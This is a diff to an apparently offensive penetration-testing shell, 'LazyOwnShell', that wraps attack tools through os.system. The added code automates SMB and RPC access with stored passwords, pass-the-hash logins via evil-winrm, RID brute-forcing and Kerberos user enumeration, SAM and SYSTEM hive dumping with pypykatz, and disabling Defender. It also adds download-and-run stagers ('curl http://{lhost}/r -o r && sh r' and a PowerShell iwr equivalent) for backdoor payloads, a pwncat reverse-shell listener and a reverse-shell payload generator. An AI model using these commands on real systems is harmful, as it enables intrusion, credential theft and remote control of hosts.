@@ -119,6 +119,8 @@ class LazyOwnShell(Cmd):
             "api_key": None,
             "prompt": None,
             "url": None,
+            "domain": None,
+            "subdomain": None,
             "method": "GET",
             "headers": "{}",
             "params": "{}",
@@ -2253,34 +2255,87 @@ class LazyOwnShell(Cmd):
         if not check_lhost(lhost):
             return
 
+        if not os.path.exists(path_cred):
+            if line:
+
+                nargs = len(line.split(" "))
+                if nargs == 1:
+                    print_msg(f"Try .. smbclient -N \\\\{rhost}\\\\{line} {RESET}")
+                    os.system(f"smbclient -N \\\\\\\\{rhost}\\\\{line}")
+                    return
+                if nargs == 2:
+                    args = line.split(" ")
+                    directorio = args[0]
+                    user = args[1]
+                    print_msg(f"Try .. smbclient \\\\{rhost}\\\\{directorio} -U {user} {RESET}")
+                    os.system(f"smbclient \\\\\\\\{rhost}\\\\{directorio} -U {user} ")
+                    return
             
+            print_msg(f"Perform this command: smbclient -N -L \\\\{rhost}\\ {RESET}")
+            os.system(f"smbclient -N -L \\\\{rhost}\\")
+            print_msg(
+                f'Exploit smb if is posible mount -t cifs "//{lhost}/share" /mnt/smb '
+            )
+
+            return
+        else:
+            with open(path_cred, "r") as file:
+                for file_line in file:
+                    params = file_line.split(":")
+                    user = params[0]
+                    passwd = params[1].replace("\n", "")
+                    command = f"smbclient -L //{domain}/{line} -U '{domain}\\\\{user}'"
+                    copy2clip(passwd)
+                    print_msg(command)
+                    os.system(command)
+                    print_msg(
+                        f'Exploit smb if is posible mount -t cifs "//{lhost}/share" /mnt/smb '
+                    )
+                    return
+
+    def do_smbclient_py(self, line):
+        """
+        Interacts with SMB shares using the `smbclient.py` command to perform the following operations:
+
+        1. Checks if `rhost` (remote host) and `lhost` (local host) are set; if not, an error message is displayed.
+        2. If `line` (share name) is provided:
+        - Attempts to access the specified SMB share on the remote host using the command: `smbclient.py -N \\\\{rhost}\\{line}`
+        3. If `line` is not provided:
+        - Lists available SMB shares on the remote host with the command: `smbclient.py -N -L \\\\{rhost}`
+        4. Suggests a potential SMB exploit if possible by mounting the share from the local host using: `mount -t cifs "//{lhost}/share" /mnt/smb`
+
+        :param line: The name of the SMB share to access on the remote host. If not provided, the function will list all available shares.
+        :returns: None
+        """
+
+        rhost = self.params["rhost"]
+        lhost = self.params["lhost"]
+        path_cred = "sessions/credentials.txt"
+        url = self.params["url"]
+        domain = get_domain(url)
+        if not check_rhost(rhost):
+            return
+
+        if not check_lhost(lhost):
+            return
 
         if not os.path.exists(path_cred):
-            print_error("you need credentials.txt exec: createcredentials admin:admin")
+            print_error(f"You need credentialts use:{GREEN} createcredentials admin:admin")
             return
-        with open(path_cred, "r") as file:
-            for file_line in file:
-                params = file_line.split(":")
-                user = params[0]
-                passwd = params[1].replace("\n", "")
-                command = f"smbclient -L //{domain}/{line} -U '{domain}\\\\{user}'"
-                copy2clip(passwd)
-                print_msg(command)
-                os.system(command)
-                return
-        
-        if line:
-            print_msg(f"Try .. smbclient -N \\\\{rhost}\\\\{line} {RESET}")
-            os.system(f"smbclient -N \\\\\\\\{rhost}\\\\{line}")
-            return
-        
-        
-        print_msg(f"Perform this command: smbclient -N -L \\\\{rhost}\\ {RESET}")
-        os.system(f"smbclient -N -L \\\\{rhost}\\")
-        print_msg(
-            f'Exploit smb if is posible mount -t cifs "//{lhost}/share" /mnt/smb '
-        )
-        return
+        else:
+            with open(path_cred, "r") as file:
+                for file_line in file:
+                    params = file_line.split(":")
+                    user = params[0]
+                    passwd = params[1].replace("\n", "")
+                    command = f"smbclient.py {user}:'{passwd}'@{rhost}"
+                    print_msg(command)
+                    os.system(command)
+                    print_msg(
+                        f'Exploit smb if is posible mount -t cifs "//{lhost}/share" /mnt/smb '
+                    )
+                    return
+
 
     def do_smbmap(self, line):
         """smbmap -H 10.10.10.3 [OPTIONS]
@@ -2333,15 +2388,15 @@ class LazyOwnShell(Cmd):
         To manually run this command, use the following syntax:
             sudo impacket-GetNPUsers <domain> -no-pass -usersfile sessions/users.txt
         Replace `<domain>` with the actual domain name you want to query."""
-
-        if not line:
-            print_error(
-                "You must pass the domain by argument ex: getnpusers domain.com more info help getnpusers"
-            )
-            return
-        os.system(
-            f"sudo impacket-GetNPUsers {line}/ -no-pass -usersfile sessions/users.txt"
-        )
+       
+        rhost = self.params["rhost"]
+        domain = self.params["domain"]
+        command = f"GetNPUsers.py {domain}/ -no-pass -usersfile sessions/users.txt -dc-ip {rhost}"
+        print_msg(command)
+        os.system(command)
+        command = f"sudo impacket-GetNPUsers {domain}/ -no-pass -usersfile sessions/users.txt -dc-ip {rhost}"
+        print_msg(command)
+        os.system(command)
         return
 
     def do_psexec(self, line):
@@ -2639,8 +2694,32 @@ class LazyOwnShell(Cmd):
             print_error(f"rhost must be set{RESET}")
             return
         rhost = self.params["rhost"]
-        print_msg(f"Try... rpcclient -U '' -N {rhost} {RESET}")
-        os.system(f"rpcclient -U '' -N {rhost}")
+        domain = self.params["domain"]
+        adomain = domain.split(".")
+        machine = adomain[0]
+        if not line:
+            path_cred = "sessions/credentials.txt"
+
+            if not os.path.exists(path_cred):
+                command = f"rpcclient -U '' -N {rhost}"
+                print_msg(f"Try... {GREEN} {command} {RESET}")
+                os.system(command)
+
+            else:
+                with open(path_cred, "r") as file:
+                    for file_line in file:
+                        params = file_line.split(":")
+                        username = params[0]
+                        password = params[1].replace("\n", "")
+                        command = f"rpcclient -U {machine}/{username}%{password}  {rhost}"
+                        print_msg(f"Try... {GREEN} {command} {RESET}")
+                        os.system(command)
+
+        else:
+            
+            command = f"rpcclient -U {machine}/{line} {rhost}"
+            print_msg(f"Try... {GREEN} {command} {RESET}")
+            os.system(command)
         return
 
     def do_nikto(self, line):
@@ -3083,6 +3162,42 @@ class LazyOwnShell(Cmd):
 
         rhost = self.params["rhost"]
         if check_rhost(rhost):
+            if line:
+                if line.startswith("rid"):
+                    path_cred = "sessions/credentials.txt"
+
+                    if not os.path.exists(path_cred):
+                        username = input("    [!] Enter the username with domain (e.g., 'user@domain.com'): ").strip()
+                        password = input("    [!] Enter the password: ").strip()
+                    else:
+                        with open(path_cred, "r") as file:
+                            for file_line in file:
+                                params = file_line.split(":")
+                                username = params[0]
+                                password = params[1].replace("\n", "")
+
+                    print_msg(f"Try... crackmapexec smb {rhost} -u {username} -p {password} --rid-brute")
+                    os.system(f"crackmapexec smb {rhost} -u {username} -p {password} --rid-brute")
+                    print_warn(f"Done... crackmapexec smb {rhost} -u {username} -p {password} --rid-brute")        
+                    return
+                elif line.startswith("shares"):
+                    path_cred = "sessions/credentials.txt"
+
+                    if not os.path.exists(path_cred):
+                        username = input("    [!] Enter the username with domain (e.g., 'user@domain.com'): ").strip()
+                        password = input("    [!] Enter the password: ").strip()
+                    else:
+                        with open(path_cred, "r") as file:
+                            for file_line in file:
+                                params = file_line.split(":")
+                                username = params[0]
+                                password = params[1].replace("\n", "")
+                    print_msg(f"Try... crackmapexec smb {rhost} -u {username} -p {password} --shares")
+                    os.system(f"crackmapexec smb {rhost} -u {username} -p {password} --shares")
+                    print_warn(f"Done... crackmapexec smb {rhost} -u {username} -p '{password}' --shares")
+                    return
+
+
             print_msg(f"Try... crackmapexec smb {rhost}")
             os.system(f"crackmapexec smb {rhost}")
             print_msg(f"Done... crackmapexec smb {rhost}")
@@ -3153,7 +3268,8 @@ class LazyOwnShell(Cmd):
         """
         rhost = self.params["rhost"]
         url = self.params["url"]
-        domain = get_domain(url)
+        domain = self.params["domain"]
+        
 
         if check_rhost(rhost):
             path_cred = "sessions/credentials.txt"
@@ -4770,6 +4886,50 @@ class LazyOwnShell(Cmd):
         )
         return
 
+
+    def do_pwncat(self, line):
+        """
+        Runs `pwncat` with the specified port for listening. SELFINJECT
+
+        This function starts a `pwncat` listener on the specified local port. It can use a port defined in the `lport` parameter or a port provided as an argument.
+
+        Usage:
+            pwncatcs <port>
+
+        :param line: The port number to use for the `pwncat-cs` listener. If not provided, it defaults to the `lport` parameter.
+        :type line: str
+        :returns: None
+
+        Manual execution:
+        1. Ensure that `pwncat-cs` is installed and accessible from your command line.
+        2. The port number can either be provided as an argument or be set in the `lport` parameter of the function.
+        3. Run the function to start `pwncat-cs` on the specified port.
+
+        If no port is provided as an argument, the function will use the port specified in the `lport` parameter. If a port is provided, it overrides the `lport` value.
+
+        After starting the listener, the function prints a message indicating that `pwncat-cs` is running on the specified port and another message when the session is closed.
+
+        Dependencies:
+        - `pwncat-cs`: A tool used for creating reverse shells or bind shells.
+        """
+        lhost = self.params["lhost"]
+        lport = self.params["lport"]
+        if not lport and not line:
+            print_error(
+                f"lport must be set or pass the port by parameter like: nc 6666.{RESET}"
+            )
+            return
+        if not line:
+            print_msg(f"Try.. pwncat -l {lport} --self-inject /bin/bash:{lhost}:{lport}{RESET}")
+            os.system(f"pwncat -l {lport} --self-inject /bin/bash:{lhost}:{lport}")
+        else:
+            print_msg(f"Try.. pwncat -l {line} --self-inject /bin/bash:{lhost}:{line}{RESET}")
+            os.system(f"pwncat -l {line} --self-inject /bin/bash:{lhost}:{line}")
+        print_msg(
+            f"{RED}[*] {YELLOW} Shutdown pwncat sessions in port {RED} [{lport}|{line}] {RESET}"
+        )
+        return
+
     def do_find(self, line):
         """
         Automates command execution based on a list of aliases and commands.
@@ -4873,6 +5033,8 @@ class LazyOwnShell(Cmd):
             ("WIN disable exec policy", "Set-ExecutionPolicy Bypass -Scope LocalMachine -Force"),
             ("WIN RemoteSigned", "Set-ExecutionPolicy RemoteSigned -Scope Process"),
             ("WIN Disable defender", "Set-MpPreference -SubmitSamplesConsent 2 -MAPSReporting 0"),
+            ("WIN sam", "cd / ; mkdir Temp ; reg save hklm\sam c:\Temp\sam ; reg save hklm\system c:\Temp\system ; cd Temp ; download sam ; download system"),
+            ("PYPYKATZ", "pypykatz registry --sam sam system"),
             ("WEB linkedin.com workers scrapper", 'var employees = []; employees = employees.concat(document.getElementsByTagName("h3")); for(var i=0;i<employees[0].length;i++){ 	console.log(employees[0][i].innerHTML) }')
         ]
         
@@ -8697,6 +8859,7 @@ class LazyOwnShell(Cmd):
         lport = self.params["lport"]
         path = os.getcwd()
         file = f"{path}/modules/run"
+        wfile = f"{path}/sessions/win/lazybot.ps1"
         filek = f"{path}/modules/backdoor/backdoor.c"
         files = f"{path}/modules/backdoor/server.c"
         if not check_lhost(lhost):
@@ -8714,17 +8877,30 @@ class LazyOwnShell(Cmd):
 
         with open(file, 'r') as f:
             content = f.read()
+        
+        if not is_exist(wfile):
+            return
+        with open(wfile, 'r') as f:
+            wcontent = f.read()
 
+        wcontent = wcontent.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost)
         content = content.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost)
         server = f"cd modules && python3 lazyc2.py {lport}"
         
         with open("sessions/r", 'w+') as f:
             f.write(content)
         
-        copy2clip(f"curl http://{lhost}/r -o r && sh r")
+        with open("sessions/w", 'w+') as f:
+            f.write(wcontent)
+        choice = input("    [!] choice target windows 1 or linux 2: (default: 1)") or '1'
+
+        if choice == '1':
+            copy2clip(f"iwr -uri  http://{lhost}/w -OutFile w.ps1 ; .\\w.ps1")
+        elif choice == '2':
+            copy2clip(f"curl http://{lhost}/r -o r && sh r")
+        
         with open(filek, 'r') as f:
             content = f.read()
-
         content = content.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost)
         with open("sessions/b.c", 'w+') as f:
             f.write(content)
@@ -9669,7 +9845,7 @@ class LazyOwnShell(Cmd):
         rhost = self.params["rhost"]
         path = os.getcwd()
         users_txt = f"{path}/sessions/users.txt"
-        domain = get_domain(url)
+        domain = self.params["domain"]
         
         if not check_rhost(rhost):
             return
@@ -9704,6 +9880,12 @@ class LazyOwnShell(Cmd):
             command = f"kerbrute_linux_amd64 userenum --dc {rhost} -d {domain} -t 20 -v {users_txt} "
             print_msg(command)
             os.system(command)
+            choice = input("Extend with larger dic ? (y/n)") or 'y'
+            if choice == 'y':
+                users = self.params["usrwordlist"]
+                command = f"kerbrute_linux_amd64 userenum --dc {rhost} -d {domain} -t 20 -v {users} "
+                print_msg(command)
+                os.system(command)
         return
 
     def do_dacledit(self, line):
@@ -9864,26 +10046,37 @@ class LazyOwnShell(Cmd):
         rhost = self.params["rhost"]
         path = os.getcwd()
         users_txt = f"{path}/sessions/users.txt"
+        hash_txt = f"{path}/sessions/hash.txt"
         url = self.params["url"]
         domain = get_domain(url)
         
         if not check_rhost(rhost):
             return
 
-        path_cred = "sessions/credentials.txt"        
-        
-        sub = input("enter the subdomain example dc01: ")
-        if not os.path.exists(path_cred):
-            print_error("you need credentials.txt exec: createcredentials admin:admin")
-            user = input("Enter the username: ")
+        if not line:
+            path_cred = "sessions/credentials.txt"        
+            
+            sub = input("enter the subdomain example dc01: ")
+            if not os.path.exists(path_cred):
+                print_error("you need credentials.txt exec: createcredentials admin:admin")
+                user = input("Enter the username: ")
 
-            command = f"evil-winrm -i {sub}.{domain} -u \"{user}\" -r INFILTRATOR.HTB"
-        with open(path_cred, "r") as file:
-            for file_line in file:
-                params = file_line.split(":")
-                user = params[0]
-                passwd = params[1].replace("\n", "")
-                command = f"evil-winrm -i {rhost} -u {user} -p '{passwd}'"
+                command = f"evil-winrm -i {sub}.{domain} -u \"{user}\" -r INFILTRATOR.HTB"
+            with open(path_cred, "r") as file:
+                for file_line in file:
+                    params = file_line.split(":")
+                    user = params[0]
+                    passwd = params[1].replace("\n", "")
+                    command = f"evil-winrm -i {rhost} -u {user} -p '{passwd}'"
+                    print_msg(command)
+                    os.system(command)
+            return
+        else:
+            if line.startswith("hash"):
+                with open(hash_txt, "r") as file:
+                    for file_line in file:
+                        print(file_line)
+                command = f"evil-winrm -i {rhost} -u Administrator -H '{file_line.strip()}'"
                 print_msg(command)
                 os.system(command)
         return
@@ -10948,6 +11141,15 @@ class LazyOwnShell(Cmd):
             except ValueError:
                 print_error("Invalid input. Please enter a valid number.")
                 return
+        rhost = self.params["rhost"]
+        if line:
+            if line.startswith("rid"):
+                command = f"netexec smb {rhost} -u guest -p '' --rid-brute > sessions/users_{rhost}.txt"
+                print_msg(command)
+                os.system(command)
+                os.system("cat sessions/users_{rhost}.txt | awk '{print $6}' | sponge sessions/users_{rhost}.txt".replace("{rhost}",rhost))
+                os.system(f"cat sessions/users_{rhost}.txt >> sessions/users.txt")
+                return
 
         print_warn("Select the protocol you want to use:")
         protocols = ["ssh", "winrm", "smb", "rdp", "wmi", "mssql", "ldap", "ftp", "vnc"]
@@ -10967,13 +11169,24 @@ class LazyOwnShell(Cmd):
             verbose = input("    [!] Enable verbose mode? (yes/no, default: no): ").strip().lower() == "yes"
             debug = input("    [!] Enable debug mode? (yes/no, default: no): ").strip().lower() == "yes"
 
-            netexec_command = f"netexec {protocol} -t {threads} --timeout {timeout} --jitter {jitter}"
+
+            path_cred = "sessions/credentials.txt"
+
+            if not os.path.exists(path_cred):
+                netexec_command = f"netexec {protocol} -t {threads} --timeout {timeout} --jitter {jitter} --log sessions/{rhost}_netexec.txt"
+            else:
+                with open(path_cred, "r") as file:
+                    for file_line in file:
+                        params = file_line.split(":")
+                        username = params[0]
+                        password = params[1].replace("\n", "")
+                        netexec_command = f"netexec {protocol} -t {threads} --timeout {timeout} --jitter {jitter}  -u {username} -p '{password}' --log sessions/{rhost}_{protocol}_netexec.txt "
 
             if verbose:
                 netexec_command += " --verbose"
             if debug:
                 netexec_command += " --debug"
-            rhost = self.params["rhost"]
+            
             netexec_command += f" {rhost}"
             print_msg(f"Running netexec with command: {netexec_command}")
             os.system(netexec_command)
@@ -11312,7 +11525,7 @@ class LazyOwnShell(Cmd):
         users_file = input("    [!] Enter the location of your users.txt file: ").strip() or "sessions/users.txt"
         password = input("    [!] Enter the password you want to spray at the users: ").strip()
 
-        command = f"crackmapexec smb {ip_address} -u {users_file} -p {password} --continue-on-success"
+        command = f"crackmapexec smb {ip_address} -u {users_file} -p '{password}' --continue-on-success"
         print_msg(f"Executing command: {command}")
 
         os.system(command)
@@ -12074,6 +12287,79 @@ class LazyOwnShell(Cmd):
         else:
             print_error("Invalid mode. Please enter '1' or '2'.")
 
+        return
+
+    def do_kusa(self, line):
+        """
+        Execute Kusanagi to generate payloads for command, code, or file injection.
+
+        This function allows the user to specify various parameters for configuring and running Kusanagi to
+        generate payloads for reverse/bind shells or injected files/code. It handles user input for target addresses,
+        ports, encoding, obfuscation, badchars, and other options, constructs the command, and executes it.
+
+        :param line: Not used in this implementation.
+        :returns: None
+        """
+        if not is_binary_present("kusa"):
+            print_warn("Kusanagi binary not found. installing")
+            os.system("pip install kusanagi")
+            return
+        
+        print_msg("Kusanagi - Payload Generator and Injector")
+        if not line:
+            mode = input("    [!] Choose mode (cmd 1, code 2): ").strip().lower()
+        else:
+            mode = line
+        
+        if mode == '1':
+            print_msg("Command Injection selected.")
+            rhost = input(f"    [!] Enter the target host [default: {self.params['rhost']}]: ").strip() or self.params['rhost']
+            rport = input(f"    [!] Enter the target port [default: {self.params['rport']}]: ").strip() or self.params['rport']
+            copy_payload = input("    [!] Copy payload to clipboard? (y/n): ").strip().lower() == 'y'
+            obfuscate = input("    [!] Obfuscate payload? (y/n): ").strip().lower() == 'y'
+            badchars = input("    [!] Enter badchars to filter (e.g. '/$') or leave blank: ").strip()
+            encoders = input("    [!] Enter encoders (e.g., base64 url) or leave blank: ").strip()
+            command = f"kusa cmd {rhost} {rport}"
+            if obfuscate:
+                command += " --obf"
+            if badchars:
+                command += f" -b '{badchars}'"
+            if encoders:
+                command += f" --enc {encoders}"
+
+            print_msg(f"Generated command: {command}")
+
+            if copy_payload:
+                copy2clip(command)
+                print_msg("Command copied to clipboard.")
+
+            os.system(command)
+
+        elif mode == '2':
+            print_msg("Code Injection selected.")
+            rhost = input(f"    [!] Enter the target host [default: {self.params['rhost']}]: ").strip() or self.params['rhost']
+            rport = input(f"    [!] Enter the target port [default: {self.params['rport']}]: ").strip() or self.params['rport']
+            language = input("    [!] Enter the language (e.g., python, php) or leave blank for all: ").strip()
+            shell_type = input("    [!] Enter the shell type (e.g., bash, sh, cmd, dash, zsh, PowerShell) or leave blank for all: ").strip()
+            obfuscate = input("    [!] Obfuscate payload? (y/n): ").strip().lower() == 'y'
+            badchars = input("    [!] Enter badchars to filter (e.g. '/$') or leave blank: ").strip()
+            encoders = input("    [!] Enter encoders (e.g., base64 url) or leave blank: ").strip()
+
+            command = f"kusa code {rhost} {rport}"
+            if language:
+                command += f" -l {language}"
+            if shell_type:
+                command += f" -s {shell_type}"
+            if obfuscate:
+                command += " --obf"
+            if badchars:
+                command += f" -b '{badchars}'"
+            if encoders:
+                command += f" --enc {encoders}"
+
+            print_msg(f"Generated command: {command}")
+            os.system(command)
+        return
         
 if __name__ == "__main__":
     p = LazyOwnShell()
